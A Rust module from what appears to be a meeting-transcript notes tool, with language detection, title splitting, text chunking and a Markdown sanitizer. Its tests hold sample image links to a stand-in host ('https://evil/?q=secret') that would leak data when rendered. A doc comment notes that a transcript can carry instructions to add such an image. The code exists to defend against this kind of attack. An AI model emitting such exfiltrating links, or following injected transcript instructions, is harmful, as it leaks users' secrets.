//! The transcript as the model sees it, and clean-up of what comes back.

/// One rendered line, `[mm:ss] 我：text` (the export's text format), with its segment.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Line {
    pub segment: i64,
    pub start_ms: i64,
    pub text: String,
}

/// The language notes are written in: the transcript's, not the UI's.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Language {
    Zh,
    En,
}

impl Language {
    /// Chinese unless Latin letters outnumber CJK characters three to one (an English
    /// meeting still has "我：" labels in a Chinese UI).
    pub fn of(lines: &[Line]) -> Self {
        let (mut cjk, mut latin) = (0usize, 0usize);
        for ch in lines.iter().flat_map(|line| line.text.chars()) {
            if ch.is_ascii_alphabetic() {
                latin += 1;
            } else if ('\u{4e00}'..='\u{9fff}').contains(&ch) {
                cjk += 1;
            }
        }
        if cjk * 3 >= latin && cjk > 0 {
            Language::Zh
        } else {
            Language::En
        }
    }
}

pub fn join(lines: &[Line]) -> String {
    lines
        .iter()
        .map(|line| line.text.as_str())
        .collect::<Vec<_>>()
        .join("\n")
}

const MAX_TITLE_CHARS: usize = 60;

/// `# Title` on the first non-empty line becomes the title; the rest is the body.
pub fn split_title(markdown: &str) -> (Option<String>, String) {
    let trimmed = markdown.trim_start();
    let (first, rest) = trimmed.split_once('\n').unwrap_or((trimmed, ""));
    // `#` alone or `# text`; `## text` is a section.
    let Some(title) = first
        .trim()
        .strip_prefix('#')
        .filter(|title| title.is_empty() || title.starts_with(' '))
    else {
        return (None, markdown.trim().to_owned());
    };
    let title: String = title
        .trim()
        .trim_end_matches('#')
        .trim()
        .trim_matches(|ch| matches!(ch, '*' | '"' | '“' | '”' | '「' | '」' | '《' | '》'))
        .trim()
        .chars()
        .take(MAX_TITLE_CHARS)
        .collect();
    let title = (!title.is_empty()).then_some(title);
    (title, rest.trim().to_owned())
}

/// Model-written Markdown made safe to render or export: images and raw HTML become text,
/// so nothing in it loads by itself (a transcript can contain instructions to add one).
/// Every line is escaped, code blocks too: guessing where a block starts the way every
/// Markdown reader does is not possible, and a stray backslash in code only shows.
pub fn sanitize_markdown(text: &str) -> String {
    text.lines()
        .map(|line| line.replace("![", "!\\[").replace('<', "\\<"))
        .collect::<Vec<_>>()
        .join("\n")
}

/// Cut `text` into pieces of at most `max_chars` characters, preferring a line break, then a
/// sentence end, in the last 40% of each piece.
pub fn split_text(text: &str, max_chars: usize) -> Vec<String> {
    let chars: Vec<char> = text.chars().collect();
    let max_chars = max_chars.max(1);
    let mut pieces = Vec::new();
    let mut start = 0;
    while start < chars.len() {
        let hard_end = (start + max_chars).min(chars.len());
        let mut end = hard_end;
        if hard_end < chars.len() {
            let minimum = start + (hard_end - start) * 6 / 10;
            let window = minimum..hard_end;
            if let Some(at) = window.clone().rev().find(|&i| chars[i] == '\n') {
                end = at + 1;
            } else if let Some(at) = window
                .rev()
                .find(|&i| matches!(chars[i], '。' | '！' | '？' | '.' | '!' | '?'))
            {
                end = at + 1;
            }
        }
        pieces.push(chars[start..end].iter().collect());
        start = end;
    }
    pieces
}

#[cfg(test)]
mod tests {
    use super::*;

    fn line(text: &str) -> Line {
        Line {
            segment: 1,
            start_ms: 0,
            text: text.into(),
        }
    }

    #[test]
    fn the_language_follows_the_transcript() {
        assert_eq!(
            Language::of(&[line("[00:01] 我：我们下周上线")]),
            Language::Zh
        );
        assert_eq!(
            Language::of(&[line("[00:01] 我：用 Kubernetes 部署")]),
            Language::Zh
        );
        assert_eq!(
            Language::of(&[line("[00:01] 我：we need to ship this by friday")]),
            Language::En
        );
        assert_eq!(Language::of(&[]), Language::En);
    }

    #[test]
    fn titles_are_split_off_and_cleaned() {
        assert_eq!(
            split_title("\n# **预算评审会** #\n\n## 概要\n内容"),
            (Some("预算评审会".to_owned()), "## 概要\n内容".to_owned())
        );
        assert_eq!(
            split_title("## 概要\n内容"),
            (None, "## 概要\n内容".to_owned())
        );
        assert_eq!(split_title("# \n正文"), (None, "正文".to_owned()));
    }

    #[test]
    fn images_and_html_become_text_everywhere() {
        let text = "看 ![x](https://evil/?q=secret) 和 <img src=x>\n```\n<b>code</b>\n```\n<i>";
        assert_eq!(
            sanitize_markdown(text),
            "看 !\\[x](https://evil/?q=secret) 和 \\<img src=x>\n```\n\\<b>code\\</b>\n```\n\\<i>"
        );
        // Fences other readers see differently: none of them shelters an image.
        for text in [
            "``` a`b\n![x](https://evil/?q=1)\n```",
            "    ```\n![x](https://evil/?q=1)",
            "~~~\n![x](https://evil/?q=1)\n```",
        ] {
            let clean = sanitize_markdown(text);
            assert!(!clean.contains("![") && clean.contains("!\\[x]"), "{clean}");
        }
    }

    #[test]
    fn long_text_splits_at_boundaries() {
        let text = "第一句话说完了。第二句话还没完第二句话还没完";
        let pieces = split_text(text, 12);
        assert_eq!(pieces[0], "第一句话说完了。");
        assert_eq!(pieces.concat(), text);
        assert!(pieces.iter().all(|piece| piece.chars().count() <= 12));
        assert_eq!(split_text("", 5), Vec::<String>::new());
    }
}
